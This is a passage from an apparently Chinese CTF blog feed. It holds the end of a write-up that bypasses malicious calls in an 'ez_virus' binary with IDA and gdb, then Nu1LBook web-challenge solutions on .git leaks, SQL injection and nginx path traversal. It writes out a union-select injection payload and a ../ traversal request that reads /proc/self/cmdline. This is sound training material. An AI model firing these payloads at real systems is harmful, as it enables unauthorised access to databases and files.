&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;	
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;静态patch&#34;&gt;静态patch
&lt;/h3&gt;&lt;p&gt;把73行到84行全部patch掉&lt;/p&gt;
&lt;p&gt;选中87行头，tab键回到流程图，空格看汇编&lt;/p&gt;
&lt;p&gt;记下地址：0x402681&lt;/p&gt;
&lt;p&gt;再f5回到伪代码&lt;/p&gt;
&lt;p&gt;选中73行的system位置，按tab回到流程图，再按空格回到汇编代码&lt;/p&gt;
&lt;p&gt;为了保证平衡，我们在call system上面一条汇编指令lea处&lt;/p&gt;
&lt;p&gt;点ida菜单栏的edit&amp;ndash;&amp;gt;patchprogram&amp;ndash;&amp;gt;assamble&lt;/p&gt;
&lt;p&gt;键入jmp 0x402681,只改这一条，下面的不用管，canel取消&lt;/p&gt;
&lt;p&gt;点ida菜单栏的edit&amp;ndash;&amp;gt;patchprogram&amp;ndash;&amp;gt;aplly&lt;/p&gt;
&lt;p&gt;把patch好的程序拖进linux&lt;/p&gt;
&lt;p&gt;加上执行权限&lt;code&gt;chmod +x ez_virus&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;执行&lt;code&gt;./ez_virus&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;gdb动态调试&#34;&gt;gdb动态调试
&lt;/h3&gt;&lt;p&gt;还是刚才看到的那个地址，&lt;/p&gt;
&lt;p&gt;&lt;code&gt;gdb ez_virus&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;因为跳了5次，所以我们可能需要更改5次eip（64位叫rip）&lt;/p&gt;
&lt;p&gt;在gdb里面&lt;code&gt;b *0x4025c1&lt;/code&gt;设断点&lt;/p&gt;
&lt;p&gt;r运行&lt;/p&gt;
&lt;p&gt;运行到这里的时候，我么需要控制程序流程跳过恶意代码&lt;/p&gt;
&lt;p&gt;在ida里面找到&lt;/p&gt;
&lt;p&gt;由于这里是jz，所以可能不一定会进入正常代码（这里对应的是if(v13)这个变量在恶意代码中是否分配成功）&lt;/p&gt;
&lt;p&gt;所以我们尝试进入下一句汇编（就当他没有跳转，按照程序逻辑，cmp的结果为0（即v13分配成功）则跳转，我们需要cmp的结果不为0,所以，这句需要不执行），则按照汇编流程,下一句的地址是0x402681&lt;/p&gt;
&lt;p&gt;设置eip&lt;/p&gt;
&lt;p&gt;&lt;code&gt;set $eip=0x402681&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这样就跳过了第一次恶意代码&lt;/p&gt;
&lt;p&gt;按c继续程序，程序会再次断在刚才设置的断点&lt;/p&gt;
&lt;p&gt;重复设置eip&lt;/p&gt;
&lt;p&gt;&lt;code&gt;set $eip=0x402681&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;再按c继续程序&lt;/p&gt;
&lt;p&gt;重复5次，得到flag&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Nu1LBook第一章wp</title>
        <link>https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/</link>
        <pubDate>Fri, 13 Nov 2020 05:23:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/</guid>
        <description>&lt;h1 id=&#34;第一章-web入门常见的搜集&#34;&gt;[第一章 web入门]常见的搜集
&lt;/h1&gt;&lt;h2 id=&#34;硬扫&#34;&gt;硬扫
&lt;/h2&gt;&lt;p&gt;打开页面提示信息搜集&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132244492-359770402.png&#34;
	width=&#34;723&#34;
	height=&#34;288&#34;
	srcset=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132244492-359770402_hu9486934578432963981.png 480w, https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132244492-359770402_hu92434474733764872.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201109191454703&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;251&#34;
		data-flex-basis=&#34;602px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;扫描就完事了，扫出来robots.txt、index.php~和.index.php.swp&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132244857-1597466579.png&#34;
	width=&#34;297&#34;
	height=&#34;109&#34;
	srcset=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132244857-1597466579_hu3464009714889292793.png 480w, https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132244857-1597466579_hu6842907987671509525.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201109191503594&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;272&#34;
		data-flex-basis=&#34;653px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132245263-1780283943.png&#34;
	width=&#34;217&#34;
	height=&#34;41&#34;
	srcset=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132245263-1780283943_hu2613356527968793019.png 480w, https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132245263-1780283943_hu4864340931875278948.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201109191522788&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;529&#34;
		data-flex-basis=&#34;1270px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132245622-1560254552.png&#34;
	width=&#34;1025&#34;
	height=&#34;413&#34;
	srcset=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132245622-1560254552_hu17929857093187632721.png 480w, https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132245622-1560254552_hu1950443412327582110.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201109194421877&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;248&#34;
		data-flex-basis=&#34;595px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132246026-1181389043.png&#34;
	width=&#34;690&#34;
	height=&#34;360&#34;
	srcset=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132246026-1181389043_hu4540548368265972802.png 480w, https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132246026-1181389043_hu219445288479982738.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201109193650672&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;191&#34;
		data-flex-basis=&#34;460px&#34;
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;n1book{info_1s_v3ry_imp0rtant_hack}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;第一章-web入门粗心的小李&#34;&gt;[第一章 web入门]粗心的小李
&lt;/h1&gt;&lt;h2 id=&#34;git泄露&#34;&gt;.git泄露
&lt;/h2&gt;&lt;p&gt;使用githack或者githacker&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132246341-824543893.png&#34;
	width=&#34;1294&#34;
	height=&#34;367&#34;
	srcset=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132246341-824543893_hu6139991763843630539.png 480w, https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132246341-824543893_hu628051898418382748.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201109194821129&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;352&#34;
		data-flex-basis=&#34;846px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132246746-1683360944.png&#34;
	width=&#34;1056&#34;
	height=&#34;414&#34;
	srcset=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132246746-1683360944_hu16612256200570454455.png 480w, https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132246746-1683360944_hu30512062237458833.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201109195406270&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;255&#34;
		data-flex-basis=&#34;612px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;如果用的是githack，使用命令git chechout-index -a来得到index页面&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132247110-790007756.png&#34;
	width=&#34;650&#34;
	height=&#34;313&#34;
	srcset=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132247110-790007756_hu10677178469811680567.png 480w, https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132247110-790007756_hu6669764358322557752.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201109195347885&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;207&#34;
		data-flex-basis=&#34;498px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;index.html:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132247436-1217729386.png&#34;
	width=&#34;1267&#34;
	height=&#34;308&#34;
	srcset=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132247436-1217729386_hu3709738568916855836.png 480w, https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132247436-1217729386_hu18172762763576771039.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201109195419820&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;411&#34;
		data-flex-basis=&#34;987px&#34;
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;n1book{git_looks_s0_easyfun}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;第一章-web入门sql注入-1&#34;&gt;[第一章 web入门]SQL注入-1
&lt;/h1&gt;&lt;h2 id=&#34;常规注入&#34;&gt;常规注入
&lt;/h2&gt;&lt;p&gt;首先确定是字符型的还是数字型的：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132247742-1388422534.png&#34;
	width=&#34;883&#34;
	height=&#34;178&#34;
	srcset=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132247742-1388422534_hu12595089100312315626.png 480w, https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132247742-1388422534_hu2724650209185356221.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201109195650850&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;496&#34;
		data-flex-basis=&#34;1190px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132248058-185740663.png&#34;
	width=&#34;1531&#34;
	height=&#34;665&#34;
	srcset=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132248058-185740663_hu5452158389241266129.png 480w, https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132248058-185740663_hu9029095834889454636.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201109195753084&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;230&#34;
		data-flex-basis=&#34;552px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;然后确定字段数量&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132248408-1126329567.png&#34;
	width=&#34;1145&#34;
	height=&#34;737&#34;
	srcset=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132248408-1126329567_hu18129005918198171500.png 480w, https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132248408-1126329567_hu6314118868576476721.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201109200403363&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;155&#34;
		data-flex-basis=&#34;372px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;常规爆库名、表名、列名&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;id=-1&amp;#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&amp;#39;fl4g&amp;#39;),(select group_concat(table_name) from information_schema.tables where table_schema=database()) %23
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132248856-1500230368.png&#34;
	width=&#34;1801&#34;
	height=&#34;763&#34;
	srcset=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132248856-1500230368_hu12686289965894990686.png 480w, https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132248856-1500230368_hu16931424544106653484.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201109201127797&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;236&#34;
		data-flex-basis=&#34;566px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132249264-1940310651.png&#34;
	width=&#34;1903&#34;
	height=&#34;740&#34;
	srcset=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132249264-1940310651_hu15978493582721842646.png 480w, https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132249264-1940310651_hu6078817875799307270.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201109201403204&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;257&#34;
		data-flex-basis=&#34;617px&#34;
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;n1book{union_select_is_so_cool}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;第一章-web入门sql注入-2&#34;&gt;[第一章 web入门]SQL注入-2
&lt;/h1&gt;&lt;h2 id=&#34;考报错注入&#34;&gt;考报错注入
&lt;/h2&gt;&lt;p&gt;post方法，直接hackbar里写，用报错注入。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132249670-1799348440.png&#34;
	width=&#34;1881&#34;
	height=&#34;377&#34;
	srcset=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132249670-1799348440_hu8110798650166057284.png 480w, https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132249670-1799348440_hu7607853605432404065.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201112203933902&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;498&#34;
		data-flex-basis=&#34;1197px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;库是note&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132250072-1214219954.png&#34;
	width=&#34;1085&#34;
	height=&#34;387&#34;
	srcset=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132250072-1214219954_hu7400469025224937619.png 480w, https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132250072-1214219954_hu11930542216674268626.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201112204043089&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;280&#34;
		data-flex-basis=&#34;672px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;爆表名列名和flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132250467-1553510745.png&#34;
	width=&#34;1171&#34;
	height=&#34;388&#34;
	srcset=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132250467-1553510745_hu3864557660660616345.png 480w, https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132250467-1553510745_hu12197345043377132483.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201112203902754&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;301&#34;
		data-flex-basis=&#34;724px&#34;
	
&gt;&lt;/p&gt;
&lt;h1 id=&#34;第一章-web入门afr_1&#34;&gt;[第一章 web入门]afr_1
&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132250751-1378203317.png&#34;
	width=&#34;922&#34;
	height=&#34;45&#34;
	srcset=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132250751-1378203317_hu15482810265678607471.png 480w, https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132250751-1378203317_hu11719770042129609195.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201109203248359&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;2048&#34;
		data-flex-basis=&#34;4917px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132251046-971330864.png&#34;
	width=&#34;673&#34;
	height=&#34;354&#34;
	srcset=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132251046-971330864_hu17782676343282130983.png 480w, https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132251046-971330864_hu1138767343095759175.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201109203307294&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;190&#34;
		data-flex-basis=&#34;456px&#34;
	
&gt;&lt;/p&gt;
&lt;h1 id=&#34;第一章-web入门afr_2&#34;&gt;[第一章 web入门]afr_2
&lt;/h1&gt;&lt;h2 id=&#34;nginx配置错误导致目录穿越&#34;&gt;nginx配置错误导致目录穿越
&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132251638-367561607.png&#34;
	width=&#34;452&#34;
	height=&#34;354&#34;
	srcset=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132251638-367561607_hu17012290869005041276.png 480w, https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132251638-367561607_hu17619609796677949949.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201112205127708&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;127&#34;
		data-flex-basis=&#34;306px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;查看静态文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132252357-1322787075.png&#34;
	width=&#34;1120&#34;
	height=&#34;443&#34;
	srcset=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132252357-1322787075_hu12966978291197294485.png 480w, https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132252357-1322787075_hu5153933396209610952.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201112205158280&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;252&#34;
		data-flex-basis=&#34;606px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;直接在img后面加两个.，使目录变为img/..&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132252789-130161940.png&#34;
	width=&#34;943&#34;
	height=&#34;336&#34;
	srcset=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132252789-130161940_hu16399652602613587952.png 480w, https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132252789-130161940_hu17543501210319001808.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201112205212125&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;280&#34;
		data-flex-basis=&#34;673px&#34;
	
&gt;&lt;/p&gt;
&lt;h5 id=&#34;读flag&#34;&gt;读flag
&lt;/h5&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132253204-500852270.png&#34;
	width=&#34;930&#34;
	height=&#34;365&#34;
	srcset=&#34;https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132253204-500852270_hu4487562816490721861.png 480w, https://dorinxl.github.io/p/nu1lbook%E7%AC%AC%E4%B8%80%E7%AB%A0wp/1858293-20201113132253204-500852270_hu5812172848621219144.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201112205411804&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;254&#34;
		data-flex-basis=&#34;611px&#34;
	
&gt;&lt;/p&gt;
&lt;h1 id=&#34;第一章-web入门afr_3&#34;&gt;[第一章 web入门]afr_3
&lt;/h1&gt;&lt;h2 id=&#34;摘自官方wp&#34;&gt;摘自官方wp
&lt;/h2&gt;&lt;p&gt;本题考查对linux系统中/proc/目录下文件作用的了解，同时考查了flask模板注入&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;请求 http://IP:PORT/article?name=../../../../../proc/self/cmdline获取当前执行系统命令，得到&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python server.py
